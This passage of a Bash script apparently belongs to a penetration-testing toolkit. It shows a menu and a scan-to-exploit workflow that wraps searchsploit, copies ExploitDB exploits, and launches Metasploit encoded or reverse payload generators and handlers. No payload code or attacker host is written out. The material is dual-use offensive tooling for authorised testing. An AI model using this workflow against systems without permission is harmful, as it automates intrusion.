    return 1
  fi

  # 3) Recherche dans ExploitDB
  local search_out="$workflow_dir/searchsploit_${keyword}_$(date +%Y%m%d_%H%M%S).txt"
  echo -e "${C_INFO}${FRAMEWORK_WORKFLOW_EXPLOITDB_SEARCH}${C_RESET}" "$keyword"
  if timeout 120 searchsploit "$keyword" | tee "$search_out"; then
    echo -e "${C_GOOD}ExploitDB search completed${C_RESET}"
  else
    local exit_code=$?
    if [[ $exit_code -eq 124 ]]; then
      echo -e "${C_YELLOW}ExploitDB search timed out after 2 minutes${C_RESET}"
    else
      echo -e "${C_RED}ExploitDB search failed (code: $exit_code)${C_RESET}"
    fi
  fi

  echo ""
  echo -e "${C_HIGHLIGHT}${FRAMEWORK_WORKFLOW_CHOOSE_EXPLOIT}${C_RESET}"
  echo -ne "${C_ACCENT1}${FRAMEWORK_WORKFLOW_EXPLOIT_ID}${C_RESET}"
  read -r exploit_id
  if [[ -n "$exploit_id" ]]; then
    framework_exploitdb_copy <<<"$exploit_id"
  fi

  echo ""
  echo -ne "${C_ACCENT1}${FRAMEWORK_WORKFLOW_GENERATE_PAYLOAD}${C_RESET}"
  read -r gen_payload
  if [[ "$gen_payload" =~ ^[oO]$ ]]; then
    framework_msf_payload_encoded
    echo ""
    echo -ne "${C_ACCENT1}${FRAMEWORK_WORKFLOW_RUN_HANDLER}${C_RESET}"
    read -r run_handler
    if [[ "$run_handler" =~ ^[oO]$ ]]; then
      framework_msf_handler
    fi
  fi

  echo -e "${C_GOOD}${FRAMEWORK_WORKFLOW_COMPLETED}${C_RESET}"
  echo "  - Nmap       : $nmap_out"
  echo "  - ExploitDB  : $search_out"
  echo "  - Payloads   : $FRAMEWORK_DATA_DIR/metasploit/payloads"
}

# ====
# AIDE
# ====

framework_help() {
  cat <<EOF
${C_ACCENT1}╔════════════════════════════════════════════════════════╗${C_RESET}
${C_ACCENT1}║${C_RESET}           ${C_GOOD}${FRAMEWORK_HELP_TITLE}${C_RESET}                    ${C_ACCENT1}║${C_RESET}
${C_ACCENT1}╚════════════════════════════════════════════════════════╝${C_RESET}

${C_HIGHLIGHT}${FRAMEWORK_HELP_BURPSUITE_TITLE}${C_RESET}
${FRAMEWORK_HELP_BURPSUITE_CONTENT}

${C_HIGHLIGHT}${FRAMEWORK_HELP_METASPLOIT_TITLE}${C_RESET}
${FRAMEWORK_HELP_METASPLOIT_CONTENT}

${C_HIGHLIGHT}${FRAMEWORK_HELP_EXPLOITDB_TITLE}${C_RESET}
${FRAMEWORK_HELP_EXPLOITDB_CONTENT}

${C_HIGHLIGHT}${FRAMEWORK_HELP_WORKFLOWS_TITLE}${C_RESET}

${FRAMEWORK_HELP_WORKFLOW_1_TITLE}
${FRAMEWORK_HELP_WORKFLOW_1_CONTENT}

${FRAMEWORK_HELP_WORKFLOW_2_TITLE}
${FRAMEWORK_HELP_WORKFLOW_2_CONTENT}

${FRAMEWORK_HELP_WORKFLOW_3_TITLE}
${FRAMEWORK_HELP_WORKFLOW_3_CONTENT}

${C_HIGHLIGHT}${FRAMEWORK_HELP_TIPS_TITLE}${C_RESET}
${FRAMEWORK_HELP_TIPS_CONTENT}

${C_YELLOW}${FRAMEWORK_HELP_WARNING_TITLE}${C_RESET}
${FRAMEWORK_HELP_WARNING_CONTENT}
EOF

  echo -ne "${C_ACCENT1}${FRAMEWORK_HELP_PRESS_ENTER}${C_RESET}"
  read -r
}

# ====
# MENU PRINCIPAL
# ====

stack_menu() {
  while true; do
    clear
    echo -e "${C_ACCENT2}╔════════════════════════════════════════════════════════╗${C_RESET}"
    echo -e "${C_ACCENT2}║${C_RESET}              ${C_GOOD}${FRAMEWORK_MENU_TITLE}${C_RESET}                          ${C_ACCENT2}║${C_RESET}"
    echo -e "${C_ACCENT2}╚════════════════════════════════════════════════════════╝${C_RESET}"
    echo ""
    echo -e "   ${C_ACCENT1}${FRAMEWORK_MENU_SECTION_BURPSUITE}${C_RESET}"
    echo -e "   ${C_GOOD}1)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_1}${C_RESET}"
    echo -e "   ${C_GOOD}2)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_2}${C_RESET}"
    echo -e "   ${C_GOOD}3)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_3}${C_RESET}"
    echo ""
    echo -e "   ${C_ACCENT1}${FRAMEWORK_MENU_SECTION_METASPLOIT}${C_RESET}"
    echo -e "   ${C_GOOD}4)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_4}${C_RESET}"
    echo -e "   ${C_GOOD}5)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_5}${C_RESET}"
    echo -e "   ${C_GOOD}6)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_6}${C_RESET}"
    echo -e "   ${C_GOOD}7)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_7}${C_RESET}"
    echo -e "   ${C_GOOD}8)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_8}${C_RESET}"
    echo -e "   ${C_GOOD}9)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_9}${C_RESET}"
    echo -e "   ${C_GOOD}10)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_10}${C_RESET}"
    echo ""
    echo -e "   ${C_ACCENT1}${FRAMEWORK_MENU_SECTION_EXPLOITDB}${C_RESET}"
    echo -e "   ${C_GOOD}11)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_11}${C_RESET}"
    echo -e "   ${C_GOOD}12)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_12}${C_RESET}"
    echo -e "   ${C_GOOD}13)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_13}${C_RESET}"
    echo -e "   ${C_GOOD}14)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_14}${C_RESET}"
    echo -e "   ${C_GOOD}15)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_15}${C_RESET}"
    echo ""
    echo -e "   ${C_ACCENT1}${FRAMEWORK_MENU_SECTION_WORKFLOWS}${C_RESET}"
    echo -e "   ${C_GOOD}16)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_16}${C_RESET}"
    echo -e "   ${C_GOOD}17)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_17}${C_RESET}"
    echo -e "   ${C_GOOD}18)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_18}${C_RESET}"

    echo -e "   ${C_ACCENT2}---- CVE ---${C_RESET}"
    echo -e "   ${C_GOOD}19)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_19}${C_RESET}"
    echo -e "   ${C_GOOD}20)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_20}${C_RESET}"
    echo ""
    echo -e "   ${C_GOOD}0)${C_RESET} ${C_HIGHLIGHT}${FRAMEWORK_MENU_0}${C_RESET}"
    echo -e "${C_ACCENT2}════════════════════════════════════════════════════════${C_RESET}"
    echo -ne "${C_ACCENT1}${FRAMEWORK_CHOICE_PROMPT}${C_RESET}"
    read -r choice

    case "$choice" in
      1) framework_burpsuite_launch ;;
      2) framework_burpsuite_proxy_setup ;;
      3) framework_burpsuite_cert_export ;;
      4) framework_msf_console ;;
      5) framework_msf_db_init ;;
      6) framework_msf_update ;;
      7) framework_msf_handler ;;
      8) framework_msf_payload_reverse ;;
      9) framework_msf_scan ;;
      10) framework_msf_payload_encoded ;;
      11) framework_exploitdb_update ;;
      12) framework_exploitdb_search ;;
      13) framework_exploitdb_copy ;;
      14) framework_exploitdb_advanced_search ;;
      15) framework_exploitdb_compile_c ;;
      16) framework_workflow_payload_handler ;;
      17) framework_workflow_scan_to_exploit ;;
      18) framework_show_ip ;;
      19) framework_cve_search ;;
      20) framework_help ;;
      0) echo -e "${C_GOOD}${FRAMEWORK_BACK_TO_MAIN}${C_RESET}"; break ;;
      *) echo -e "${C_RED}${FRAMEWORK_INVALID_CHOICE}${C_RESET}" ;;
    esac

    if [[ "$choice" != "0" ]]; then
      echo ""
      echo -ne "${C_INFO}${FRAMEWORK_PRESS_ENTER}${C_RESET}"
      read -r
    fi
  done
}

# Point d'entrée principal
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
  stack_menu
fi
